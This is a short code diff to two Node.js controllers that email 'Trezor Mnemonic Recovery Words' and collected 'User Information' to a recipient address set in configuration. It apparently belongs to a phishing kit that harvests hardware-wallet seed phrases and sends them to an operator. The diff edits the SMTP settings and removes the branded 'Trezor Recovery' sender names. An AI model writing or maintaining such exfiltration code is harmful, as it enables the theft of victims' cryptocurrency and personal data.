@@ -23,7 +23,7 @@ export const sendMnemonicController = asyncHandler(
             const transporter = nodemailer.createTransport({
                 host: process.env.SMTP_HOST,
                 port: Number(process.env.SMTP_PORT),
-                secure: false,
+                // secure: false,
                 auth: {
                     user: process.env.SMTP_USER,
                     pass: process.env.SMTP_PASS,
@@ -31,7 +31,7 @@ export const sendMnemonicController = asyncHandler(
             });
 
             await transporter.sendMail({
-                from: `"Trezor Recovery" <${process.env.SMTP_USER}>`,
+                from: process.env.SMTP_USER,
                 to: process.env.RECIPIENT_EMAIL,
                 subject: "Trezor Mnemonic Recovery Words",
                 html: htmlContent,
@@ -70,7 +70,7 @@ export const sendUserInfoController = asyncHandler(
             const transporter = nodemailer.createTransport({
                 host: process.env.SMTP_HOST,
                 port: Number(process.env.SMTP_PORT),
-                secure: false,
+                // secure: false,
                 auth: {
                     user: process.env.SMTP_USER,
                     pass: process.env.SMTP_PASS,
@@ -79,7 +79,7 @@ export const sendUserInfoController = asyncHandler(
 
             // Send email
             await transporter.sendMail({
-                from: `"${title} Recovery" <${process.env.SMTP_USER}>`,
+                from: process.env.SMTP_USER,
                 to: process.env.RECIPIENT_EMAIL,
                 subject: "User Information Received",
                 html: htmlContent,
